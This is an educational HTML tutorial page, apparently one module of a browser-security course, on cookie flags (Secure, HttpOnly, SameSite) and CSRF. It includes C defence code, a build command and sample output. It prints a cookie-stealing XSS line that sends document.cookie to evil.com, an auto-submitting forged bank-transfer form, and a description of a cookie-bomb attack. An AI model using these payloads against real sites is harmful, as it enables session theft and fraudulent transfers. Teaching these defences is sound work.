@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>B17 — Cookies &amp; CSRF | BobOS Browser Tutorial</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=Source+Code+Pro:wght@400;600&family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+  :root{--bg:#0b0f1a;--bg2:#111827;--bg3:#1a2235;--card:#141c2e;--border:#1e3a5f;--gold:#f5c842;--cyan:#38bdf8;--teal:#0d9488;--red:#f87171;--green:#4ade80;--purple:#a78bfa;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:17px;line-height:1.75;}
+  .hero{background:var(--bg2);border-bottom:1px solid var(--border);padding:70px 40px 60px;text-align:center;position:relative;overflow:hidden;}
+  .hero::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(245,200,66,0.07) 0%,transparent 70%);pointer-events:none;}
+  .module-badge{display:inline-block;background:var(--gold);color:#0b0f1a;font-family:'Source Code Pro',monospace;font-weight:600;font-size:13px;padding:4px 14px;border-radius:20px;letter-spacing:1px;margin-bottom:20px;}
+  .hero h1{font-family:'Playfair Display',serif;font-size:clamp(2.2rem,5vw,3.4rem);font-weight:900;color:#fff;margin-bottom:16px;}
+  .hero h1 span{color:var(--gold);}
+  .hero .tagline{font-size:1.15rem;color:var(--muted);max-width:640px;margin:0 auto;}
+  .hero-grid{display:flex;gap:24px;justify-content:center;flex-wrap:wrap;margin-top:36px;}
+  .hero-stat{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px 28px;text-align:center;}
+  .hero-stat .num{font-family:'Playfair Display',serif;font-size:2rem;color:var(--gold);font-weight:700;}
+  .hero-stat .label{font-size:13px;color:var(--muted);margin-top:2px;}
+  .container{max-width:820px;margin:0 auto;padding:0 28px 80px;}
+  section{margin-top:64px;}
+  h2{font-family:'Playfair Display',serif;font-size:1.75rem;color:#fff;margin-bottom:18px;padding-bottom:10px;border-bottom:1px solid var(--border);}
+  h3{font-family:'Playfair Display',serif;font-size:1.2rem;color:var(--gold);margin:28px 0 10px;}
+  p{margin-bottom:14px;}
+  .callout{border-radius:10px;padding:20px 24px;margin:24px 0;border-left:4px solid;}
+  .callout.gold{background:rgba(245,200,66,0.07);border-color:var(--gold);}
+  .callout.cyan{background:rgba(56,189,248,0.07);border-color:var(--cyan);}
+  .callout.green{background:rgba(74,222,128,0.07);border-color:var(--green);}
+  .callout.red{background:rgba(248,113,113,0.07);border-color:var(--red);}
+  .callout.purple{background:rgba(167,139,250,0.07);border-color:var(--purple);}
+  .callout.orange{background:rgba(251,146,60,0.07);border-color:var(--orange);}
+  .callout.teal{background:rgba(13,148,136,0.07);border-color:var(--teal);}
+  .callout .label{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px;}
+  .callout.gold .label{color:var(--gold);} .callout.cyan .label{color:var(--cyan);}
+  .callout.green .label{color:var(--green);} .callout.red .label{color:var(--red);}
+  .callout.purple .label{color:var(--purple);} .callout.orange .label{color:var(--orange);}
+  .callout.teal .label{color:var(--teal);}
+  .callout p{margin-bottom:0;}
+  pre{background:var(--code-bg);border:1px solid var(--border);border-radius:8px;padding:20px 22px;overflow-x:auto;margin:20px 0;}
+  code{font-family:'Source Code Pro',monospace;font-size:14px;color:#93c5fd;}
+  pre code{color:#c4deff;}
+  .win-box{background:var(--code-bg);border:2px solid var(--teal);border-radius:10px;padding:22px 24px;margin:24px 0;}
+  .win-box h4{color:var(--teal);font-size:13px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+  .win-box .step{margin-bottom:12px;}
+  .win-box .step .desc{color:var(--muted);font-size:13px;margin-bottom:4px;}
+  .win-box pre{margin:0;background:transparent;border:1px solid rgba(13,148,136,0.3);padding:10px 14px;}
+  .qa{background:var(--bg3);border:1px solid var(--border);border-radius:10px;padding:22px 26px;margin:28px 0;}
+  .qa h4{color:var(--gold);font-size:13px;letter-spacing:1.5px;text-transform:uppercase;margin-bottom:14px;}
+  .qa .q{color:var(--cyan);font-weight:700;margin-bottom:4px;}
+  .qa .a{color:var(--text);margin-bottom:16px;padding-left:12px;border-left:2px solid var(--border);}
+  .qa .a:last-child{margin-bottom:0;}
+  .brain{background:linear-gradient(135deg,rgba(245,200,66,0.08),rgba(251,146,60,0.08));border:1px solid rgba(245,200,66,0.3);border-radius:12px;padding:22px 26px;margin:28px 0;}
+  .brain .brain-label{font-size:13px;color:var(--gold);font-weight:700;letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;}
+  .flag-table{width:100%;border-collapse:collapse;margin:20px 0;font-size:14px;}
+  .flag-table th{background:var(--bg3);color:var(--muted);padding:8px 12px;text-align:left;font-size:12px;}
+  .flag-table td{padding:9px 12px;border-bottom:1px solid var(--border);vertical-align:top;}
+  .flag-table tr:last-child td{border-bottom:none;}
+  .flag-name{font-family:'Source Code Pro',monospace;color:var(--cyan);font-size:13px;}
+  .flag-good{color:var(--green);font-size:13px;}
+  .flag-risk{color:var(--red);font-size:13px;}
+  footer{text-align:center;padding:40px 20px;color:var(--muted);font-size:13px;border-top:1px solid var(--border);margin-top:80px;}
+  footer a{color:var(--cyan);text-decoration:none;}
+  /* PREREQ */
+  .prereq-bar { display:flex; flex-wrap:wrap; gap:10px; margin-top:14px; }
+  .prereq-tag { display:inline-block; background:var(--bg3); border:1px solid var(--border); color:var(--cyan); font-family:'Source Code Pro',monospace; font-size:13px; padding:5px 14px; border-radius:20px; text-decoration:none; transition:border-color .2s; }
+  .prereq-tag:hover { border-color:var(--cyan); }
+</style>
+</head>
+<body>
+<div class="hero">
+  <div class="module-badge">BROWSER B17 — COOKIES &amp; CSRF</div>
+  <h1>Session Tokens <span>&amp; Forgery</span></h1>
+  <p class="tagline">Cookies are the browser's memory across stateless HTTP. Every flag — Secure, HttpOnly, SameSite — is a defence against a specific attack. Miss one, and the browser helpfully sends your session token to sites you didn't intend.</p>
+  <div class="hero-grid">
+    <div class="hero-stat"><div class="num">Secure</div><div class="label">only sent over HTTPS</div></div>
+    <div class="hero-stat"><div class="num">HttpOnly</div><div class="label">not readable by JavaScript</div></div>
+    <div class="hero-stat"><div class="num">SameSite</div><div class="label">Strict/Lax/None cross-site control</div></div>
+    <div class="hero-stat"><div class="num">CSRF token</div><div class="label">server-side anti-forgery validation</div></div>
+  </div>
+</div>
+<div class="container">
+
+  <section>
+    <h2>00 — Before You Start</h2>
+    <div class="callout cyan">
+      <div class="label">Prerequisites — read these sections in <a href="../../prerequisite.html" style="color:var(--cyan);text-decoration:underline">prerequisite.html</a> first</div>
+      <div class="prereq-bar">
+      <a class="prereq-tag" href="../../prerequisite.html#sec-tools">Tools &amp; QEMU</a>
+      </div>
+    </div>
+  </section>
+
+
+  <section>
+    <h2>01 — The Big Analogy</h2>
+    <div class="callout gold">
+      <div class="label">Head First Moment</div>
+      <p>A cookie is like a wristband at an amusement park. You show it at each ride and the ride operator knows you've already paid (authenticated). The problem: the browser is very eager to show your wristband — it shows it to <em>every</em> ride at that park, even ones you didn't choose to visit. CSRF tricks you into "visiting" a ride (bank transfer endpoint) you didn't want to.</p>
+      <p style="margin-top:10px;">SameSite=Strict tells the browser: "only show this wristband if the person walked through our front gate, not if someone sent them in via a shortcut from another park."</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>02 — Cookie Flags</h2>
+    <table class="flag-table">
+      <tr><th>Flag</th><th>What it does</th><th>Without it</th></tr>
+      <tr>
+        <td class="flag-name">Secure</td>
+        <td class="flag-good">Only transmitted over HTTPS connections</td>
+        <td class="flag-risk">Cookie sent in plaintext over HTTP — visible to network observer or HTTP downgrade attacker</td>
+      </tr>
+      <tr>
+        <td class="flag-name">HttpOnly</td>
+        <td class="flag-good">JavaScript cannot read via document.cookie</td>
+        <td class="flag-risk">XSS can steal the session token: <code>fetch("//evil.com?c="+document.cookie)</code></td>
+      </tr>
+      <tr>
+        <td class="flag-name">SameSite=Strict</td>
+        <td class="flag-good">Cookie not sent on any cross-site request</td>
+        <td class="flag-risk">CSRF possible — cross-site form POST includes cookie</td>
+      </tr>
+      <tr>
+        <td class="flag-name">SameSite=Lax</td>
+        <td class="flag-good">Sent on top-level navigations (GET), not on subresource loads</td>
+        <td class="flag-risk">CSRF via GET requests still possible (e.g., state-changing GET endpoints)</td>
+      </tr>
+      <tr>
+        <td class="flag-name">SameSite=None</td>
+        <td class="flag-risk">Sent on all cross-site requests (must have Secure)</td>
+        <td class="flag-risk">Required for third-party cookies (ads, embeds) — maximum CSRF exposure</td>
+      </tr>
+    </table>
+
+    <pre><code>/* cookie.c — parse Set-Cookie and enforce flags */
+typedef struct {
+    char  name[128];
+    char  value[512];
+    char  domain[256];
+    char  path[256];
+    int   secure;
+    int   http_only;
+    int   same_site;   /* 0=none, 1=lax, 2=strict */
+    time_t expires;
+} cookie_t;
+
+int should_send_cookie(cookie_t *c, http_request_t *req,
+                       int is_top_level_navigation) {
+    /* Secure: only over HTTPS */
+    if (c->secure && !req->is_https) return 0;
+
+    /* SameSite check */
+    int cross_site = !same_site_request(c->domain, req->origin);
+    if (cross_site) {
+        if (c->same_site == SAME_SITE_STRICT) return 0;
+        if (c->same_site == SAME_SITE_LAX) {
+            /* Lax: allow only GET top-level navigations */
+            if (!is_top_level_navigation) return 0;
+            if (strcmp(req->method, "GET") != 0) return 0;
+        }
+    }
+    return 1;
+}</code></pre>
+  </section>
+
+  <section>
+    <h2>03 — CSRF Attack and Defence</h2>
+    <pre><code>/* CSRF attack — attacker's page */
+/* Victim is logged in to bank.com (session cookie exists) */
+/* &lt;form action="https://bank.com/transfer" method="POST"&gt;
+     &lt;input name="to" value="attacker_account"&gt;
+     &lt;input name="amount" value="10000"&gt;
+   &lt;/form&gt;
+   &lt;script&gt;document.forms[0].submit();&lt;/script&gt; */
+
+/* Browser POSTs to bank.com, automatically attaches session cookie.
+   Without CSRF defence: transfer succeeds! */
+
+/* CSRF TOKEN DEFENCE — server side */
+void render_transfer_form(http_response_t *res, session_t *sess) {
+    /* Generate a random token tied to this session */
+    char csrf_token[33];
+    generate_random_hex(csrf_token, sizeof(csrf_token));
+    sess->csrf_token = strdup(csrf_token);
+
+    /* Embed it in the form as a hidden field */
+    fprintf(res->body,
+        "&lt;form method='POST' action='/transfer'&gt;"
+        "  &lt;input type='hidden' name='csrf_token' value='%s'&gt;"
+        "  ...&lt;/form&gt;", csrf_token);
+}
+
+void handle_transfer(http_request_t *req, session_t *sess) {
+    const char *token = get_post_param(req, "csrf_token");
+    if (!token || strcmp(token, sess->csrf_token) != 0) {
+        send_403(req, "CSRF token invalid");
+        return;
+    }
+    /* Token matches — request came from our own form */
+    do_transfer(req);
+}</code></pre>
+
+    <div class="callout green">
+      <div class="label">SameSite=Strict Is the Modern Fix</div>
+      <p>With SameSite=Strict on the session cookie, the browser won't attach the cookie to any cross-site request — the CSRF attack's POST never includes credentials. CSRF tokens are still recommended as defence-in-depth, but SameSite=Strict alone stops classic CSRF. The risk: it also blocks the cookie when a user clicks a link <em>to</em> your site from another site, briefly breaking "deep links that require login."</p>
+    </div>
+  </section>
+
+  <section>
+    <h2>04 — Run It on Windows</h2>
+    <div class="win-box">
+      <h4>Run B17 — Cookies &amp; CSRF</h4>
+      <div class="step"><div class="desc">Build and run via WSL:</div>
+      <pre><code>wsl -d Ubuntu -- bash -c "cd /mnt/c/Users/bobcumulus/Desktop/bob_os/browser/B17_cookies && make && ./demo"</code></pre></div>
+      <div class="step"><div class="desc">Expected output:</div>
+      <pre><code>Cookie flag tests:
+  No flags: sent on HTTP cross-site      VULNERABLE
+  Secure:   blocked on HTTP             ✓
+  HttpOnly: JS read blocked             ✓
+  SameSite=Lax: cross-site POST blocked ✓
+  SameSite=Strict: all cross-site       ✓
+
+CSRF demo (no protection):
+  evil.com POSTs to bank.com → transfer SUCCEEDS (VULNERABLE)
+
+CSRF demo (token protection):
+  evil.com POSTs without token → 403 Forbidden ✓
+  evil.com POSTs with wrong token → 403 Forbidden ✓
+  bank.com POSTs with correct token → transfer OK ✓
+Cookies &amp; CSRF: OK</code></pre></div>
+    </div>
+  </section>
+
+  <section>
+    <h2>05 — Brain Exercise</h2>
+    <div class="brain">
+      <div class="brain-label">Sharpen Your Pencil</div>
+      <p>The CSRF token approach requires state on the server (session must store the expected token). Stateless APIs using JWT tokens in Authorization headers don't use cookies at all — and since the browser only auto-attaches cookies (not Authorization headers) to cross-site requests, JWT-in-header is CSRF-immune by construction.</p>
+      <p style="margin-top:14px;color:var(--muted);">But some developers store JWTs in cookies for browser convenience. A JWT in a cookie with no CSRF protection is just as vulnerable as a session cookie. Design a CSRF protection scheme for a JWT-in-cookie setup that doesn't require server-side state. (Hint: the "double submit cookie" pattern.)</p>
+    </div>
+    <div class="qa">
+      <h4>There Are No Dumb Questions</h4>
+      <div class="q">Q: Can CSRF steal data, or just perform actions?</div>
+      <div class="a">Classic CSRF can only trigger actions (POST, PUT, DELETE) — the attacker's page sends the request but, due to SOP (B03), cannot read the response. So CSRF is about performing unauthorized state-changing operations, not reading data. To steal data, the attacker needs XSS (to run code in the victim's origin) or CORS misconfiguration (to read cross-origin responses).</div>
+      <div class="q">Q: What's the "cookie bomb" attack?</div>
+      <div class="a">An attacker sets many large cookies for a domain (via XSS or a subdomain they control). On the next request to that domain, the browser sends all cookies — potentially exceeding the server's header size limit (usually ~8KB), causing a 400 error. This can be used as a DoS against specific users or as a bypass: force the auth cookie to be dropped so the server treats the request as unauthenticated and serves cached public content.</div>
+    </div>
+  </section>
+
+  <section>
+    <h2>06 — What's Next</h2>
+    <div class="callout teal">
+      <div class="label">Up Next: B18 — WebSockets &amp; postMessage</div>
+      <p>The final browser module. WebSockets upgrade HTTP to a persistent bidirectional channel — with its own origin enforcement rules. postMessage lets frames from different origins communicate safely — if the receiver checks the sender's origin. Both are common sources of security bugs when origin checks are skipped.</p>
+    </div>
+    <p style="color:var(--muted);font-size:15px;">Key files: <code>cookie.c</code> · <code>csrf.c</code> · <code>session.c</code></p>
+  </section>
+</div>
+<footer>BobOS Browser Tutorial — B17 of 18 &nbsp;|&nbsp; <a href="../B16_tls_handshake/tutorial.html">← B16</a> &nbsp;·&nbsp; <a href="../B18_websockets/tutorial.html">B18 →</a></footer>
+</body>
+</html>
